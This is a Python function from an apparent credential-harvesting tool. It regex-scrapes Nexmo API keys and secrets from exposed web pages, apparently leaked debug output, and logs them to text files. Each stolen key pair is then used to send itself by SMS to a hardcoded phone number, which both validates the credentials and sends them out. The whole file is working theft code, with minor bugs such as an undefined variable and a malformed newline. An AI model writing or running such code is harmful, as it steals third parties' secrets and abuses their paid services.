import requests, os, sys, codecs
from re import findall as reg
import nexmo
from time import time as timer
import time
def nexmox(all1,url):
    try:
        if "NEXMO" in all1:
            
            try:
                open ('./work/NEXMO.txt', 'a').write (get_source.content+'/n')
                
                print ("NEXMO 1")
                NEXMO_KEY = reg('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', all1)[0]
                NEXMO_SECRET = reg('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', all1)[0]
                open ('nexmo.txt', 'a').write (url+ '\n'+'NEXMO_API_KEY : '+NEXMO_KEY + '\n' )
                open ('nexmo.txt', 'a').write ('NEXMO_API_SECRET : '+NEXMO_SECRET + '\n'+ '========================================='+ '\n' )
                
                msg=NEXMO_KEY+' - '+NEXMO_SECRET
                client1 = nexmo.Client(key=NEXMO_KEY, secret=NEXMO_SECRET)
                response11 = client1.send_message({'from': 'service','to': '+21690309793','text': msg,})
                
            except:
                print ("NEXMO 1 Faild")
                pass
            try:
                
                print ("NEXMO 3")
                NEXMO_APIKEY = reg('<td>NEXMO_APIKEY<\/td>\s+<td><pre.*>(.*?)<\/span>', all1)[0]
                NEXMO_APISECRET = reg('<td>NEXMO_APISECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', all1)[0]
                open ('nexmo.txt', 'a').write (url+ '\n'+'NEXMO_APIKEY : '+NEXMO_APIKEY + '\n' )
                open ('nexmo.txt', 'a').write ('NEXMO_APISECRET : '+NEXMO_APISECRET + '\n'+ '========================================='+ '\n' )
                msg=NEXMO_APIKEY+' - '+NEXMO_APISECRET
                client11 = nexmo.Client(key=NEXMO_APIKEY, secret=NEXMO_APISECRET)
                response112 = client11.send_message({'from': 'service','to': '+21690309793','text': msg,})
                
            except:
                print ("NEXMO 1 Faild")
                pass            
            try:
                print ("NEXMO 2")
                NEXMO_API_KEY = reg('<td>NEXMO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', all1)[0]
                NEXMO_API_SECRET = reg('<td>NEXMO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', all1)[0]
                open ('nexmo.txt', 'a').write (url+ '\n'+'NEXMO_API_KEY : '+NEXMO_API_KEY + '\n' )
                open ('nexmo.txt', 'a').write ('NEXMO_API_SECRET : '+NEXMO_API_SECRET + '\n'+ '========================================='+ '\n' )
                msg=NEXMO_API_KEY+' - '+NEXMO_API_SECRET
                client3 = nexmo.Client(key=NEXMO_API_KEY, secret=NEXMO_API_SECRET)
                response3 = client3.send_message({'from': 'service','to': '+21690309793','text': msg,})                
            except:
                print ("NEXMO 1 Faild")
                pass
            time.sleep(2)                               
    except:
        
        pass